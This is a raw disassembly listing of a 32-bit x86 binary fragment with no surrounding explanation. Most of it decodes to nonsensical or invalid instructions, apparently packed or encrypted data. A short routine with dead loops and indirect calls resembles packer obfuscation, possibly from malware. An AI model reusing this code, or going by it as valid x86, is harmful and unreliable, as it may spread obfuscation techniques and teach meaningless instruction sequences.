  406a17:	shr    BYTE PTR [esi*8-0x25b46189],1
  406a1e:	test   eax,0x5f6634b2
  406a23:	jmp    0x5add3018
  406a28:	jecxz  0x406a63
  406a2a:	xlat   BYTE PTR ds:[ebx]
  406a2b:	or     eax,0x409c980a
  406a30:	retf   0xd15
  406a33:	(bad)  [edx+0x3b]
  406a36:	test   eax,0x6fb3d461
  406a3b:	or     BYTE PTR [ecx],bh
  406a3d:	(bad)  
  406a3e:	neg    DWORD PTR [eax+0x7c5754d6]
  406a44:	jne    0x406a0b
  406a46:	jns    0x4069fd
  406a48:	mov    bh,0xac
  406a4a:	mov    esp,0x29297266
  406a4f:	mov    ebp,0xfc442d95
  406a54:	lea    di,[ecx+0x6c5ae0fc]
  406a5b:	out    dx,eax
  406a5c:	adc    al,0x99
  406a5e:	cmp    cl,ah
  406a60:	(bad)  
  406a63:	stc    
  406a64:	in     eax,dx
  406a65:	cmp    al,0xb1
  406a67:	mov    cl,0xdd
  406a69:	pusha  
  406a6a:	out    dx,al
  406a6b:	rol    DWORD PTR [eax-0xdbe90f3],0x7c
  406a72:	fisttp WORD PTR [ecx]
  406a74:	and    esi,DWORD PTR [esi-0x21]
  406a77:	fnsave [bx+di-0x50]
  406a7b:	mov    ebp,0x47a8df67
  406a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a81:	mov    al,ds:0x9769dc57
  406a86:	mov    ebx,ebx
  406a88:	retf   0x313f
  406a8b:	hlt    
  406a8c:	hlt    
  406a8d:	fwait
  406a8e:	call   0xf72513f7
  406a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a94:	adc    esp,DWORD PTR [ecx+edx*2-0x1a3570b9]
  406a9b:	dec    ecx
  406a9c:	(bad)  
  406a9d:	clc    
  406a9e:	add    ecx,edi
  406aa0:	mov    ds:0x6a3b8a87,al
  406aa5:	shr    BYTE PTR [ecx],0x81
  406aa8:	push   ebx
  406aa9:	mov    ebx,DWORD PTR [ebp-0x6f1815ba]
  406aaf:	dec    esi
  406ab0:	in     eax,dx
  406ab1:	xlat   BYTE PTR ds:[ebx]
  406ab2:	hlt    
  406ab3:	leave  
  406ab4:	push   ss
  406ab5:	adc    BYTE PTR [ebx+0x27],bh
  406ab8:	nop
  406ab9:	cmp    BYTE PTR [esi+0x1d],bl
  406abc:	mov    BYTE PTR [edx],al
  406abe:	in     eax,0x3c
  406ac0:	xor    eax,ecx
  406ac2:	add    eax,0x32729c
  406ac7:	leave  
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e6fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fcd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e6ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fcd9
  406b20:	and    esi,DWORD PTR ds:0x42e128
  406b26:	mov    DWORD PTR ds:0x42fcd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e6f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e6f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e6f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e2df
  406b61:	mov    edi,DWORD PTR ds:0x42e6f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e6f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fcf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fcf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fcf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fcfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e53f
  406bad:	mov    edi,DWORD PTR ds:0x42fcf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fcf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fce5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fce5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fce5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fce5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fce5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fced
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e45b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fd76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fd76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fd76,edi
  406c22:	cmp    DWORD PTR ds:0x42fd76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e707
  406c34:	push   0x42e1a4
  406c39:	call   DWORD PTR ds:0x42e543
  406c3f:	cmp    DWORD PTR ds:0x42fd76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fd76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fd76,edi
  406c59:	cmp    DWORD PTR ds:0x42fd76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e713,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e70b,0x42fd76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x80
  406c9b:	cs js  0x406ce2
  406c9e:	pop    ss
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406c69
  406ca7:	mov    al,BYTE PTR [esi]
  406ca9:	imul   esp,DWORD PTR [edx+0x11750f5a],0xce55de35
  406cb3:	add    DWORD PTR [edi],edi
  406cb5:	enter  0x794b,0x29
  406cb9:	push   es
  406cba:	lock aad 0xab
  406cbd:	sbb    bl,0x38
  406cc0:	test   eax,0x7a336059
  406cc5:	bound  ebx,QWORD PTR [esi]
  406cc7:	ja     0x406d0e
  406cc9:	call   DWORD PTR [ecx]
  406ccb:	mov    dh,0xf1
  406ccd:	ror    BYTE PTR [edi-0x7175aa5b],cl
  406cd3:	pop    ss
  406cd4:	pop    ebx
  406cd5:	fidivr WORD PTR [ebp-0x45]
  406cd8:	sub    al,0x75
  406cda:	mov    dl,0x3e
  406cdc:	shl    ah,1
  406cde:	xlat   BYTE PTR ds:[ebx]
  406cdf:	int    0x27
  406ce1:	cwde   
  406ce2:	test   BYTE PTR [edi+0x3e06a47e],al
  406ce8:	(bad)  
  406ce9:	push   ebp
  406cea:	pop    ds
  406ceb:	stc    
  406cec:	or     eax,0xaab925f6
  406cf1:	inc    ebp
  406cf2:	call   0x78c16ac8
  406cf7:	sub    esp,DWORD PTR [edi]
  406cf9:	fs (bad) 
  406cfb:	mov    dh,0x64
  406cfd:	ja     0x406d4e
  406cff:	ja     0x406ced
  406d01:	arpl   WORD PTR [edx],bx
  406d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d04:	jb     0x406c9c
  406d06:	mov    ebp,0x81804e81
  406d0b:	jbe    0x406ce0
  406d0d:	or     ecx,ebx
  406d0f:	or     BYTE PTR [ebp+0x3b],al
  406d12:	and    eax,0x71e0f2bd
  406d17:	cmp    al,0xf
  406d19:	pop    esp
  406d1a:	hlt    
  406d1b:	gs jecxz 0x406d6a
  406d1e:	push   cs
  406d1f:	xchg   BYTE PTR [ebx+0x76237ca9],cl
  406d25:	mov    ah,0x80
  406d27:	icebp  
  406d28:	sar    bh,0x76
  406d2b:	sub    edx,esi
  406d2d:	pop    ebx
  406d2e:	sbb    al,0x6e
  406d30:	inc    esi
  406d31:	(bad)  
  406d32:	mov    edi,0x1d27e988
  406d37:	(bad)  [ebp-0x33]
  406d3a:	mov    bl,0xf7
  406d3c:	popf   
  406d3d:	fidiv  WORD PTR [edx-0x28004ec8]
  406d43:	sub    eax,0xdc11f3da
  406d48:	adc    ch,al
  406d4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d4b:	ins    DWORD PTR es:[edi],dx
  406d4c:	xor    ebx,DWORD PTR [eax+0x41565fd8]
  406d52:	add    DWORD PTR [ebx-0x36],0xf3ea9ef3
  406d59:	repnz xchg ebp,eax
  406d5b:	aam    0xbd
  406d5d:	jns    0x406dd6
  406d5f:	or     DWORD PTR [edx-0x15],0xa71d257e
  406d66:	pushf  
  406d67:	dec    edx
  406d68:	sahf   
  406d69:	xchg   BYTE PTR [eax+0x5e49a402],dl
  406d6f:	adc    bh,dh
  406d71:	out    dx,eax
  406d72:	pop    ds
  406d73:	inc    eax
  406d74:	clc    
  406d75:	call   0x603d:0xab2c1ca1
  406d7c:	push   ds
  406d7d:	ror    BYTE PTR [ecx-0x69b818bc],0x9b
  406d84:	xchg   edi,edx
  406d86:	adc    DWORD PTR [edx-0x6f],esp
  406d89:	loope  0x406de0
  406d8b:	pop    eax
  406d8c:	int    0xe4
  406d8e:	outs   dx,BYTE PTR ds:[esi]
  406d8f:	and    esp,DWORD PTR [ecx+0x34]
  406d92:	mul    eax
  406d94:	mov    cl,0x18
  406d96:	loop   0x406d90
  406d98:	mov    WORD PTR [ebx],fs
  406d9a:	xor    ebp,edx
  406d9c:	jmp    0x12c3c73b
  406da1:	ret    
  406da2:	pop    esi
  406da3:	call   0xab47:0x805c61ea
  406daa:	icebp  
  406dab:	pop    ss
  406dac:	leave  
  406dad:	ins    DWORD PTR es:[edi],dx
  406dae:	repz int3 
  406db0:	ret    0xd8cb
  406db3:	xor    DWORD PTR [eax-0x7c37ad0f],edx
  406db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dba:	mov    ebp,ebx
  406dbc:	shr    BYTE PTR [ebp+0x76479ebd],0x85
  406dc3:	pop    ebx
  406dc4:	push   edx
  406dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dc6:	push   ss
  406dc7:	and    al,0xc6
  406dc9:	aad    0xee
  406dcb:	jns    0x406d84
  406dcd:	dec    esi
  406dce:	mov    edx,0xc3304eff
  406dd3:	push   ebx
  406dd4:	int    0xbb
  406dd6:	and    al,0x7a
  406dd8:	push   cs
  406dd9:	fisubr WORD PTR [edi]
  406ddb:	jnp    0x406d80
  406ddd:	outs   dx,DWORD PTR ds:[esi]
  406dde:	sbb    cl,bl
  406de0:	mov    dl,0x1f
  406de2:	push   ss
  406de3:	pop    esi
  406de4:	mov    ebp,0xacae3f5e
  406de9:	fadd   DWORD PTR [esi+esi*4+0x57345511]
  406df0:	cmp    BYTE PTR [esi+0x40],bl
  406df3:	inc    eax
  406df4:	lods   eax,DWORD PTR ds:[esi]
  406df5:	test   DWORD PTR [ecx],eax
  406df7:	fwait
  406df8:	xlat   BYTE PTR ds:[ebx]
  406df9:	lock push ebx
  406dfb:	mov    esp,0x1e29ec82
  406e00:	push   edi
  406e01:	cmp    al,0x74
  406e03:	fcomp  DWORD PTR [edi+0x43]
  406e06:	inc    esi
  406e07:	in     al,0xd2
  406e09:	and    bh,BYTE PTR [edi+0x6c6a11c8]
  406e0f:	push   es
  406e10:	sbb    dl,dl
  406e12:	mov    DWORD PTR [ecx-0x28],esi
  406e15:	int    0xb0
  406e17:	gs cmp eax,0xeaa3bef9
  406e1d:	rcr    DWORD PTR [ecx+eax*2],1
  406e20:	push   eax
  406e21:	scas   eax,DWORD PTR es:[edi]
  406e22:	addr16 es loope 0x406e7c
  406e26:	mov    cl,0x2
  406e28:	jmp    0xca5177cf
  406e2d:	push   0xffffff95
  406e2f:	rcr    BYTE PTR [edi+0x1],0xc4
  406e33:	std    
  406e34:	popa   
  406e35:	repz in al,0x1
  406e38:	cmp    edi,ebp
  406e3a:	pop    ecx
  406e3b:	bound  edx,QWORD PTR ss:[ebx+0x34447fc8]
  406e42:	in     eax,0xf8
  406e44:	dec    esp
  406e45:	arpl   WORD PTR [edx],dx
  406e47:	idiv   DWORD PTR [edx+0x9abf986]
  406e4d:	retf   0xf9b6
  406e50:	or     cl,ah
  406e52:	test   al,0x78
  406e54:	loop   0x406e58
  406e56:	mov    BYTE PTR ds:0xbf1d499c,dl
  406e5c:	shr    BYTE PTR [edx-0x10370ba8],cl
  406e62:	leave  
  406e63:	stos   BYTE PTR es:[edi],al
  406e64:	dec    edx
  406e65:	imul   ebp,eax,0xffffffa2
  406e68:	pop    esi
  406e69:	pop    ebx
  406e6a:	dec    esi
  406e6b:	mov    ?,WORD PTR ds:0x54c2d440
  406e71:	dec    BYTE PTR ds:0x9f6c3635
  406e77:	or     DWORD PTR [ecx-0x67dcd8ad],ecx
  406e7d:	xor    al,0xf6
  406e7f:	enter  0x1061,0xee
  406e83:	(bad)  
  406e85:	cmp    BYTE PTR ds:0xd0ed135b,0xb6
  406e8c:	jp     0x406e71
  406e8e:	cmc    
  406e8f:	leave  
  406e90:	sti    
  406e91:	and    eax,0xb76fca2
  406e96:	xchg   DWORD PTR [edi],eax
  406e98:	fsubr  DWORD PTR [esi-0x181c90ae]
  406e9e:	sbb    al,BYTE PTR [ecx]
  406ea0:	(bad)  
  406ea1:	in     al,0x3
  406ea3:	clc    
  406ea4:	call   0xa86b:0x4907121a
  406eab:	jns    0x406e2e
  406ead:	imul   esi,ebp,0xa930f096
  406eb3:	adc    ebp,esp
  406eb5:	adc    edx,edx
  406eb7:	cwde   
  406eb8:	loop   0x406ef2
  406eba:	jg     0x406ebf
  406ebc:	fist   DWORD PTR [ebp+0x1482c34]
  406ec2:	data16 add BYTE PTR [ecx],ah
  406ec5:	fs xor ah,bh
  406ec8:	adc    bh,BYTE PTR [ebx+0x54]
  406ecb:	hlt    
  406ecc:	xor    al,0x80
  406ece:	xor    DWORD PTR [esi+0x7f],ebx
  406ed1:	jne    0x406f32
  406ed3:	pop    esp
  406ed4:	xchg   esi,eax
  406ed5:	adc    eax,0xf1ba4e15
  406eda:	xchg   DWORD PTR [ebx+0x5be54041],eax
  406ee0:	xor    BYTE PTR [esi],0x7d
  406ee3:	mov    ebp,0xc6370efe
  406ee8:	and    al,0xd
  406eea:	fwait
  406eeb:	jnp    0x406e9e
  406eed:	mov    ch,0x68
  406eef:	mov    ah,0x75
  406ef1:	xor    ebp,DWORD PTR [esi+0x48]
  406ef4:	out    0xb1,al
  406ef6:	xchg   ebx,eax
  406ef7:	xor    BYTE PTR [ebp-0x38],ah
  406efa:	or     al,0x6
  406efc:	(bad)  
  406efd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406efe:	xor    DWORD PTR [eax],ebp
  406f00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f01:	(bad)  
  406f02:	fwait
  406f03:	mov    es,WORD PTR [ecx]
  406f05:	out    dx,eax
  406f06:	mov    ebx,0xfd4de898
  406f0b:	iret   
  406f0c:	aam    0xbf
  406f0e:	icebp  
  406f0f:	cld    
  406f10:	mov    ebx,0x468bf7d
  406f15:	mov    ebp,0xb71b5c
  406f1a:	loopne 0x406f1c
  406f1c:	xchg   ebp,eax
  406f1d:	lods   al,BYTE PTR ds:[esi]
  406f1e:	test   eax,0xac4588ba
  406f23:	and    edx,DWORD PTR [edx+eax*4]
  406f26:	xchg   cl,al
  406f28:	aaa    
  406f29:	clc    
  406f2a:	fisub  WORD PTR [edi+0x6cede4c6]
  406f30:	mov    WORD PTR [ebx+ecx*1],gs
  406f33:	lods   al,BYTE PTR ds:[esi]
  406f34:	jle    0x406f1e
  406f36:	xor    al,0x3a
  406f38:	push   edx
  406f39:	push   es
  406f3a:	stos   DWORD PTR es:[edi],eax
  406f3b:	xchg   ecx,eax
  406f3c:	mov    dl,0x35
  406f3e:	dec    eax
  406f3f:	jg     0x406f72
  406f41:	stos   BYTE PTR es:[edi],al
  406f42:	data16 and al,0x5d
  406f45:	sub    eax,0x7fd70eee
  406f4a:	dec    edi
  406f4b:	jb     0x406f03
  406f4d:	aaa    
  406f4e:	js     0x406ef5
  406f50:	adc    eax,0x6ed4c796
  406f55:	cmp    dl,dh
  406f57:	jb     0x406fb6
  406f59:	add    ah,BYTE PTR [eax+0x63]
  406f5c:	shr    ebx,1
  406f5e:	lock fucomp st(3)
  406f61:	xchg   edx,eax
  406f62:	mov    ah,0x8c
  406f64:	ss inc esp
  406f66:	(bad)  
  406f68:	and    eax,0x903b55cb
  406f6d:	xor    DWORD PTR [ebp-0x626fc276],edi
  406f73:	in     eax,dx
  406f74:	ja     0x406f88
  406f76:	cmc    
  406f77:	sub    DWORD PTR [esi+0x64cce931],edi
  406f7d:	in     al,dx
  406f7e:	call   0x3476:0xde5feb27
  406f85:	test   DWORD PTR [ecx+0x3981006a],edi
  406f8b:	fisub  DWORD PTR [edi]
  406f8d:	cmp    dh,bh
  406f8f:	das    
  406f90:	add    ah,al
  406f92:	mov    dl,BYTE PTR [ebp+0x1e]
  406f95:	(bad)  
  406f96:	jp     0x406f2b
  406f98:	sahf   
  406f99:	xchg   DWORD PTR [ebp+0x11],eax
  406f9c:	inc    ecx
  406f9d:	sbb    ebp,ebp
  406f9f:	push   ds
  406fa0:	and    ch,BYTE PTR ds:0x301c8bf6
  406fa6:	in     eax,0xc6
  406fa8:	mov    ecx,0x74534788
  406fad:	test   DWORD PTR [ebx-0x3c],ebx
  406fb0:	dec    eax
  406fb1:	jno    0x406f43
  406fb3:	mov    ds:0xc741bc46,eax
  406fb8:	jp     0x406f8b
  406fba:	add    DWORD PTR [ebp+0x60],0xffffff99
  406fbe:	or     al,BYTE PTR [edi+ebx*8+0xbf70068]
  406fc5:	popa   
  406fc6:	pusha  
  406fc7:	xor    DWORD PTR [edi+0x2e],ecx
  406fca:	xor    al,al
  406fcc:	out    0xb0,eax
  406fce:	ins    BYTE PTR es:[edi],dx
  406fcf:	mov    al,ds:0xfa3f6247
  406fd4:	jle    0x406fe9
  406fd6:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406fdd:	adc    DWORD PTR ds:0x42fd72,0x42e70b
  406fe7:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406fee:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406ff5:	add    eax,0xac
  406ffa:	jmp    0x407347
  406fff:	sbb    al,0x75
  407001:	sar    DWORD PTR [esi+0x71b35a51],1
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [edx+0x45],si
  40700d:	ret    0xc7cd
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x407062
  407018:	xchg   ebp,eax
  407019:	inc    ebp
  40701a:	mov    cl,0x8c
  40701c:	jmp    0x407094
  40701e:	imul   ebp,DWORD PTR [esp+edx*8],0x4d
  407022:	aas    
  407023:	jmp    0x407004
  407025:	pushf  
  407026:	pop    edx
  407027:	or     al,BYTE PTR [esi-0x6a]
  40702a:	jmp    0x407082
  40702c:	call   0xa2e6:0x7bc60ea9
  407033:	cli    
  407034:	nop
  407035:	ret    
  407036:	push   es
  407037:	push   ds
  407038:	jecxz  0x40701b
  40703a:	ret    0xead2
  40703d:	push   cs
  40703e:	(bad)  
  40703f:	fist   WORD PTR ds:0xb8812127
  407045:	sar    BYTE PTR [ebx-0x6c38713a],1
  40704b:	jl     0x406fe8
  40704d:	jne    0x407060
  40704f:	dec    eax
  407050:	sti    
  407051:	xor    eax,0x5c247e71
  407056:	nop
  407057:	ss push ds
  407059:	aad    0xef
  40705b:	pop    ecx
  40705c:	das    
  40705d:	aas    
  40705e:	ss int 0xe
  407061:	ins    DWORD PTR es:[edi],dx
  407062:	clc    
  407063:	in     eax,dx
  407064:	jo     0x4070b3
  407066:	ss mov eax,0xc172ba1b
  40706c:	enter  0x69bd,0x87
  407070:	ds push esi
  407072:	pop    ss
  407073:	pushf  
  407074:	push   cs
  407075:	popf   
  407076:	repnz dec esi
  407078:	mov    dl,0x68
  40707a:	adc    DWORD PTR [esi-0x5],ebx
  40707d:	mov    ds:0x79fcb97d,al
  407082:	dec    esi
  407083:	push   eax
  407084:	mov    eax,ds:0x592d347b
  407089:	push   ebp
  40708a:	push   esi
  40708b:	cld    
  40708c:	je     0x407023
  40708e:	push   esi
  40708f:	and    ebp,esi
  407091:	sub    DWORD PTR [edi+edx*1],0x3adb608e
  407098:	popa   
  407099:	push   es
  40709a:	in     al,dx
  40709b:	push   ds
  40709c:	arpl   WORD PTR [edx],si
  40709e:	lock je 0x40706e
  4070a1:	fs xchg edx,eax
  4070a3:	inc    eax
  4070a4:	test   ah,bh
  4070a6:	iret   
  4070a7:	or     al,dl
  4070a9:	mov    DWORD PTR [ebp-0xaf21e8],eax
  4070af:	sti    
  4070b0:	xchg   DWORD PTR [esi+0xe],eax
  4070b3:	and    al,0x8c
  4070b5:	enter  0xa444,0x5d
  4070b9:	aad    0x52
  4070bb:	fwait
  4070bc:	add    eax,0x9ab5b82f
  4070c1:	shl    ch,0x46
  4070c4:	cmp    DWORD PTR gs:[esi+edx*2+0x5fe8c086],ecx
  4070cc:	sub    eax,0x7e4fdf6f
  4070d1:	add    eax,0x94fc0129
  4070d6:	mov    ebx,0xe32fb76d
  4070db:	std    
  4070dc:	add    DWORD PTR [ecx-0x77],esi
  4070df:	mov    bl,0xee
  4070e1:	ss cmc 
  4070e3:	sbb    al,0xf0
  4070e5:	cmp    eax,0xc8d03c19
  4070ea:	loop   0x407098
  4070ec:	test   eax,0x12514bea
  4070f1:	mov    ch,0x6f
  4070f3:	or     eax,DWORD PTR [ecx+0x38]
  4070f6:	sbb    al,0x7a
  4070f8:	popa   
  4070f9:	rcl    BYTE PTR ds:0x71f6deb6,1
  4070ff:	xchg   ebp,eax
  407100:	outs   dx,DWORD PTR ds:[esi]
  407101:	js     0x4070bb
  407103:	es and al,0x98
  407106:	rol    DWORD PTR [ecx-0x3df8802d],cl
  40710c:	pop    eax
  40710d:	fmul   st,st(7)
  40710f:	ret    
  407110:	(bad)  
  407111:	(bad)  
  407112:	jns    0x4070af
  407114:	jb     0x407114
  407116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407117:	and    edx,DWORD PTR [esi+0x5407cb41]
  40711d:	(bad)  
  40711e:	pop    edi
  40711f:	addr16 adc bl,bl
  407122:	rcl    ecx,0x8a
  407125:	xor    edx,ebp
  407127:	fisubr WORD PTR [edx]
  407129:	in     eax,0x1d
  40712b:	or     al,0xc4
  40712d:	in     eax,0x2c
  40712f:	mov    edx,ecx
  407131:	icebp  
  407132:	fsubr  QWORD PTR [ebx]
  407134:	aaa    
  407135:	stos   BYTE PTR es:[edi],al
  407136:	mov    esp,0xf6be65f7
  40713b:	or     edx,DWORD PTR [edi+ebp*2-0x79]
  40713f:	adc    BYTE PTR [ebx-0x38b84252],ch
  407145:	xchg   edx,eax
  407146:	cmp    DWORD PTR [eax-0x43],ecx
  407149:	jl     0x40719a
  40714b:	bound  ebp,QWORD PTR [edx-0x64bdb32e]
  407151:	dec    eax
  407152:	inc    esi
  407153:	ds jbe 0x40715b
  407156:	ret    
  407157:	sbb    al,0xad
  407159:	retf   0x34b5
  40715c:	inc    esp
  40715d:	test   al,0xaf
  40715f:	and    BYTE PTR [ebp-0x6f],cl
  407162:	icebp  
  407163:	cmp    eax,0xb6572b60
  407168:	xchg   edx,eax
  407169:	dec    DWORD PTR [eax-0x4a92188a]
  40716f:	push   ebp
  407170:	sub    DWORD PTR [ecx-0x4788bffa],ebx
  407176:	adc    DWORD PTR [ecx],0xfffffff7
  407179:	cmp    esp,esi
  40717b:	stc    
  40717c:	rol    DWORD PTR [esi-0x57],1
  40717f:	mov    ds:0x7d79d846,eax
  407184:	sub    eax,0xa9c6e504
  407189:	(bad)  
  40718a:	cmp    BYTE PTR [bx+si-0x3],0xd
  40718f:	loopne 0x4071c0
  407191:	mov    ch,0xa6
  407193:	mov    ds:0x81e2fffe,al
  407198:	xor    ebp,DWORD PTR [ebx-0x26c52c5c]
  40719e:	jmp    FWORD PTR [edx+0x16]
  4071a1:	xchg   DWORD PTR [ecx-0x7bac5305],edi
  4071a7:	xchg   ecx,eax
  4071a8:	out    dx,eax
  4071a9:	pop    ecx
  4071aa:	shl    BYTE PTR [edi+0x31bb7d67],cl
  4071b0:	test   eax,0x651073c4
  4071b5:	pop    edi
  4071b6:	pop    esi
  4071b7:	ror    DWORD PTR [edi+0x36],1
  4071ba:	sub    eax,0x743bc1d9
  4071bf:	fnsave [eax]
  4071c1:	and    ah,BYTE PTR [edx+edx*2]
  4071c4:	mov    dl,0x1a
  4071c6:	lods   eax,DWORD PTR ds:[esi]
  4071c7:	ins    DWORD PTR es:[edi],dx
  4071c8:	dec    ebx
  4071c9:	enter  0x945f,0xcb
  4071cd:	cli    
  4071ce:	xor    eax,0x1875507a
  4071d3:	mov    ah,0x1f
  4071d5:	push   es
  4071d6:	or     DWORD PTR [ecx-0x56],edi
  4071d9:	mov    eax,0xbce86991
  4071de:	rcl    dh,1
  4071e0:	rcr    BYTE PTR [edx+0xb],0xdf
  4071e4:	cs test eax,0xd846d150
  4071ea:	or     al,0x12
  4071ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071ed:	test   ecx,ecx
  4071ef:	xchg   ecx,eax
  4071f0:	(bad)  
  4071f1:	mov    ds:0xdace7734,al
  4071f6:	ss jb  0x4071fe
  4071f9:	and    BYTE PTR [eax],dh
  4071fb:	and    BYTE PTR [edx-0x4ccf9909],bh
  407201:	ins    DWORD PTR es:[edi],dx
  407202:	bound  eax,QWORD PTR [eax]
  407204:	jp     0x4071c1
  407206:	push   ds
  407207:	lds    ecx,FWORD PTR [esi]
  407209:	nop
  40720a:	xchg   ebx,eax
  40720b:	jecxz  0x407215
  40720d:	and    al,0x48
  40720f:	jge    0x407220
  407211:	sbb    BYTE PTR [eax+edx*8+0x2da22fbf],al
  407218:	jns    0x4071f7
  40721a:	adc    bl,BYTE PTR [esi]
  40721c:	out    0x12,al
  40721e:	or     esp,DWORD PTR [eax+edx*8]
  407221:	lahf   
  407222:	jno    0x407210
  407224:	jmp    0x80c0ea3b
  407229:	scas   eax,DWORD PTR es:[edi]
  40722a:	ror    DWORD PTR [ebp-0x56],cl
  40722d:	scas   al,BYTE PTR es:[edi]
  40722e:	je     0x407251
  407230:	cwde   
  407231:	push   ds
  407232:	xor    eax,edi
  407234:	sub    eax,0xaac4e27a
  407239:	dec    eax
  40723a:	add    al,0x46
  40723c:	nop
  40723d:	shl    DWORD PTR [ebx],cl
  40723f:	popa   
  407240:	mov    ebx,0xbc910c6d
  407245:	pop    ecx
  407246:	pop    ss
  407247:	scas   al,BYTE PTR es:[edi]
  407248:	daa    
  407249:	push   0xffffffe0
  40724b:	ret    0xa60e
  40724e:	ret    
  40724f:	jo     0x407290
  407251:	mov    bl,0xd3
  407253:	aas    
  407254:	or     al,0xb4
  407256:	or     eax,0x40092173
  40725b:	nop
  40725c:	jmp    0x6661:0xbfbe55db
  407263:	fcom   DWORD PTR [ebp*2-0x67bb4d65]
  40726a:	or     eax,0x19f82909
  40726f:	imul   esp,DWORD PTR [ebp-0xc],0x8dd49dcd
  407276:	(bad)  
  407277:	mov    ds:0x98c12cd,al
  40727c:	ds aaa 
  40727e:	push   ecx
  40727f:	and    dh,dl
  407281:	data16 mov bh,0x1d
  407284:	xchg   edx,eax
  407285:	arpl   WORD PTR [ecx],bx
  407287:	rcr    BYTE PTR [edx+0x23],cl
  40728a:	ins    DWORD PTR es:[edi],dx
  40728b:	shr    al,1
  40728d:	jecxz  0x407248
  40728f:	data16 (bad) 
  407291:	aad    0x10
  407293:	and    al,0xe9
  407295:	mov    al,ds:0x6db63332
  40729a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40729b:	aas    
  40729c:	or     ch,BYTE PTR [eax+0x2a2ce498]
  4072a2:	push   ecx
  4072a3:	fwait
  4072a4:	sbb    al,0x4a
  4072a6:	lahf   
  4072a7:	pop    ebx
  4072a8:	push   ebx
  4072a9:	ss (bad) 
  4072ab:	xlat   BYTE PTR ds:[ebx]
  4072ac:	idiv   DWORD PTR [ecx+0x5cd0f040]
  4072b2:	dec    eax
  4072b3:	jo     0x4072c1
  4072b5:	aam    0xee
  4072b7:	cs jmp 0x40729e
  4072ba:	sub    eax,0x160fa26f
  4072bf:	or     DWORD PTR [ecx+0x377af29d],edx
  4072c5:	pop    es
  4072c6:	in     al,0xc3
  4072c8:	fs pop esp
